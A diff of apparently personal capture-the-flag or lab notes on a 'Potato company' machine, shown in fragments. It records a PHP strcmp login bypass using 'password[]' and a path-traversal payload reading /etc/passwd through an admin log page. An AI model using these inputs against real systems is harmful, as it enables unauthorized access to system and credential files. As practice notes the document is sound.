@@ -92,29 +92,29 @@ Nmap done: 1 IP address (1 host up) scanned in 21.74 seconds
 
 http://192.168.242.101/
 
-![](Pasted%20image%2020260530181620.png)
+![[Pasted image 20260530181620.png]]
 
 ```zsh
 <html> <head><title>Potato company</title></head> <body> <h1>Potato company</h1> <p>At the moment, there is nothing. This site is under construction. To make you wait, here is a photo of a potato:</p> <img src="[potato.jpg](view-source:http://192.168.242.101/potato.jpg)"> </body> <html>
 ```
 
-![](Pasted%20image%2020260530182142.png)
+![[Pasted image 20260530182142.png]]
 
-![](Pasted%20image%2020260530191827.png)
+![[Pasted image 20260530191827.png]]
 
 https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
 
-![](Pasted%20image%2020260530191736.png)
+![[Pasted image 20260530191736.png]]
 
 password[]== ''
 
-![](Pasted%20image%2020260530191615.png)
+![[Pasted image 20260530191615.png]]
 
 ## Open response in browser
 
-![](Pasted%20image%2020260530192140.png)
+![[Pasted image 20260530192140.png]]
 
-![](Pasted%20image%2020260530192113.png)
+![[Pasted image 20260530192113.png]]
 
 http://192.168.157.101/admin/dashboard.php?page=log
 
@@ -139,7 +139,7 @@ Priority: u=0, i
 file=../../../../../etc/passwd
 ```
 
-![](Pasted%20image%2020260531180758.png)
+![[Pasted image 20260531180758.png]]
 
 webadmin
 
